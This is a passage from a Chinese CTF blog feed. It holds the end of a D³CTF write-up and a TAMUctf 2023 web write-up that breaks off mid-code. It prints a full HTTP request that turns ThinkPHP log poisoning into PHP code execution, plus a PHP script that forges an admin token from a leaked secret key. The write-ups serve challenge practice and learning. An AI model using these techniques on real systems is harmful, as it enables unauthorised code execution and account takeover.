<strong>(第一次遇到得自己挖0day的题)</strong></p><p>我们可以通过更改昵称来完全控制 <strong>$details</strong>（此处为 get_nickname(UID)）。action_name 为 “user_edit”。</p><p><img src="../images/image-20230506222438638.png" alt="image-20230506222438638"></p><p>修改名称</p><p><img src="../images/image-20230506222544278.png" alt="image-20230506222544278"></p><p>Thinkphp 框架在 Loader.php 中定义了⼀个名为 include_file 的函数</p><p><img src="../images/image-20230506222655072.png" alt="image-20230506222655072"></p><p>所以我们可以将think__include_file作为第⼀个参数传递给call_user_func。</p><p>奇怪的是，thinkphp在./runtime下记录了SQL⽇志，⽽我们刚才做的是修改admin的昵称。昵称先被拼接成⼀条SQL命令，然后记 录到⽇志中。</p><p><img src="../images/image-20230506225333824.png" alt="image-20230506225333824"></p><p><img src="../images/image-20230506225655306.png" alt="image-20230506225655306"></p><p>2.编辑admin的昵称，使⽇志⽂件包含我们的webshell。</p><p>3.擦除缓存。这⼀步是必须的，否则昵称不会更新。</p><p><img src="../images/image-20230506230530708.png" alt="image-20230506230530708"></p><p>将昵称编辑为../runtime/2023/05/01.log。我们可以通过发送这样的请求来执⾏PHP代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /admin.php/admin/index/profile.html HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 114</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,</span><br><span class="line">like Gecko) Chrome/103.0.5060.53 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Referer: http://localhost/admin.php/admin/index/profile.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: dolphin_uid=1;</span><br><span class="line">dolphin_signin_token=ab5f486a24426d9158c99507da45ae3bac476dd6;</span><br><span class="line">PHPSESSID=88h9tlthje0nfe2sod7c8v6e39</span><br><span class="line">Connection: close</span><br><span class="line">__token__=d8c89447445b0095fb569725f91f0505&amp;nickname=../runtime/log/202304/29.log</span><br><span class="line">&amp;email=&amp;password=&amp;mobile=&amp;avatar=0&amp;x=phpinfo();</span><br></pre></td></tr></table></figure><p>最后改命令来拿flag就行了</p><p><strong>难坏了</strong>   <strong>居然得自己分析源码来拿链子</strong>。。。。。。。</p><p>这里的话java还有好多东西没看  所以java题就先不进行复现了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里的复现都是去网上搜索前几名发的wp来复现的&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;amp;mid=2247486967&amp;amp;idx=1&amp;amp;sn=ad55ddd11c6</summary>
      
    
    
    
    
    <category term="AntCTF x D³CTF" scheme="https://ke1nys.github.io/tags/AntCTF-x-D%C2%B3CTF/"/>
    
  </entry>
  
  <entry>
    <title>TAMUctf 2023-web-复现</title>
    <link href="https://ke1nys.github.io/posts/662b134b.html"/>
    <id>https://ke1nys.github.io/posts/662b134b.html</id>
    <published>2023-05-01T06:06:14.000Z</published>
    <updated>2023-05-03T12:37:29.077Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/tamuctf/tamuctf-2023/tree/master/web">官方wp地址</a></p><p><a href="https://velog.io/@sani/TAMU-CTF-writeups">韩国老外的wp</a></p><h2 id="Blackbox"><a href="#Blackbox" class="headerlink" title="Blackbox"></a>Blackbox</h2><p><img src="../images/image-20230501140913517.png" alt="image-20230501140913517"></p><p>这里的话访问会报错，就是个文件包含，然后可以尝试用伪协议进行读取文件内容</p><p><img src="../images/image-20230501141309538.png" alt="image-20230501141309538"></p><p>扫目录的时候发先git源码泄露  于是使用githack工具去看能否读取到一些东西</p><p><img src="../images/image-20230501142033211.png" alt="image-20230501142033211"></p><p>读取到了文件，然后并下载下来了</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$resource</span> = <span class="string">&#x27;home&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./util.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(INCLUDE_DIR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$resource</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">&#x27;home.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>util.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">db_login</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$username</span>, <span class="keyword">string</span> <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(DB_FILE);</span><br><span class="line">  <span class="variable">$statement</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT key FROM users WHERE username=:uname AND password=:passwd;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:uname&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">  <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:passwd&#x27;</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">try_auth</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$username</span>, <span class="keyword">string</span> <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$hash_password</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$password</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">db_login</span>(<span class="variable">$username</span>, <span class="variable">$hash_password</span>)-&gt;<span class="title function_ invoke__">fetchArray</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_guest_token</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;user_key&#x27;</span>=&gt;<span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">8</span>)), <span class="string">&#x27;admin&#x27;</span>=&gt;<span class="literal">false</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">generate_token</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_admin_token</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$username</span>, <span class="keyword">string</span> <span class="variable">$user_key</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>, <span class="string">&#x27;user_key&#x27;</span>=&gt;<span class="variable">$user_key</span>, <span class="string">&#x27;admin&#x27;</span>=&gt;<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">generate_token</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_token</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$b64json</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>));</span><br><span class="line">  <span class="variable">$hmac</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$b64json</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$b64json</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$hmac</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify_token</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$token</span></span>) </span>&#123; </span><br><span class="line">  <span class="variable">$token_data</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$token_data</span>[<span class="number">0</span>]) == <span class="variable">$token_data</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_admin</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$token</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">verify_token</span>(<span class="variable">$token</span>)) &#123;</span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(DB_FILE);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>)[<span class="number">0</span>]), <span class="literal">TRUE</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$user_key</span> = <span class="variable">$data</span>[<span class="string">&#x27;user_key&#x27;</span>];</span><br><span class="line">    <span class="variable">$admin</span> = <span class="variable">$data</span>[<span class="string">&#x27;admin&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$statement</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM users WHERE username=:uname AND key=:ukey;&#x27;</span>);</span><br><span class="line">    <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:uname&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:ukey&#x27;</span>, <span class="variable">$user_key</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span> != <span class="literal">false</span> &amp;&amp; <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetchArray</span>() != <span class="literal">false</span> &amp;&amp; <span class="variable">$admin</span> == <span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230501142551816.png" alt="image-20230501142551816"></p><p>因为index.php里面有config.php所以就下载下来查看</p><p><strong>config.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">APP_NAME</span> = <span class="string">&#x27;Blackbox&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">INCLUDE_DIR</span> = <span class="string">&#x27;./templates/&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">DB_FILE</span> = <span class="string">&#x27;../sqlite/site-data.db&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_KEY</span> = <span class="string">&#x27;JYOFGX6w5ylmYXyHuMM2Rm7neHXLrBd2V0f5No3NlP8&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>login.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;auth_token&#x27;</span>, <span class="title function_ invoke__">generate_guest_token</span>(), <span class="title function_ invoke__">time</span>() + (<span class="number">86400</span>*<span class="number">30</span>), <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">is_admin</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=admin&#x27;</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">try_auth</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span> != <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;auth_token&#x27;</span>, <span class="title function_ invoke__">generate_admin_token</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], <span class="title function_ invoke__">end</span>(<span class="variable">$result</span>)), <span class="title function_ invoke__">time</span>() + (<span class="number">86400</span>*<span class="number">30</span>), <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=admin&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(INCLUDE_DIR . <span class="string">&#x27;header.php&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;main&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">login</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">form</span> <span class="title">action</span>=&quot;?<span class="title">page</span>=<span class="title">login</span>&quot;, <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">username</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Username</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">id</span>=&quot;<span class="title">username</span>&quot;&gt;&lt;/<span class="title">input</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">password</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">id</span>=&quot;<span class="title">password</span>&quot;&gt;&lt;/<span class="title">input</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">submit</span>&quot;&gt;<span class="title">Login</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">main</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> <span class="title">include</span>(<span class="title">INCLUDE_DIR</span> . &#x27;<span class="title">footer</span>.<span class="title">php</span>&#x27;); ?&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p><strong>admin.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>]) || !<span class="title function_ invoke__">is_admin</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=login&#x27;</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(INCLUDE_DIR . <span class="string">&#x27;header.php&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">  &lt;h1&gt;<span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>); <span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(INCLUDE_DIR . <span class="string">&#x27;footer.php&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结合上面的代码就可以发现只要<code>auth_token</code>能判定为管理员的话，就可以跳转到?page=admin  </p><p>所以接先去login页面拿到cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6Imd1ZXN0IiwidXNlcl9rZXkiOiJlZGEzNTBkYjFiNzk3NjRiIiwiYWRtaW4iOnRydWV9.fab86457458d9707b051bc8bb7619e8c</span><br></pre></td></tr></table></figure><p>然后进行解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;guest&quot;,&quot;user_key&quot;:&quot;eda350db1b79764b&quot;,&quot;admin&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>这里的话伪造的话就很关键了，user_key的话要成功伪造成admin的user_key，所以git源码泄露的数据库就有用了</p><p><img src="../images/image-20230501143637851.png" alt="image-20230501143637851"></p><p>查看这个数据库就会发现有个admin的user_key</p><p>然后进行修改使用</p><p>然后结合util.php里的代码进行使用</p><p>就是生成加密字符串后面的签名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_KEY</span> = <span class="string">&#x27;JYOFGX6w5ylmYXyHuMM2Rm7neHXLrBd2V0f5No3NlP8&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_token</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$b64json</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>));</span><br><span class="line">  <span class="variable">$hmac</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$b64json</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$b64json</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$hmac</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify_token</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$token</span></span>) </span>&#123; </span><br><span class="line">  <span class="variable">$token_data</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$token_data</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$token_data</span>[<span class="number">0</span>]) == <span class="variable">$token_data</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9rZXkiOiIyNmNlYjY4NWY0NmU2ZDIyIiwiYWRtaW4iOnRydWV9.58fed7114a165282749650cf5458d31f&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">verify_token</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230501145041707.png" alt="image-20230501145041707"></p><p>然后就可以拿到flag了</p><h2 id="Migraine"><a href="#Migraine" class="headerlink" title="Migraine"></a>Migraine</h2><p>题目</p><p><img src="../images/image-20230501145238358.png" alt="image-20230501145238358"></p><p>题目给了个源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;uncaughtException&#x27;</span>, <span class="function">(<span class="params">err, origin</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname+<span class="string">&#x27;/static/index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> src = req.<span class="property">body</span>[<span class="string">&#x27;src&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (src.<span class="title function_">match</span>(<span class="regexp">/[A-Za-z0-9]/</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">418</span>).<span class="title function_">end</span>(<span class="string">&#x27;Bad character detected.&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> 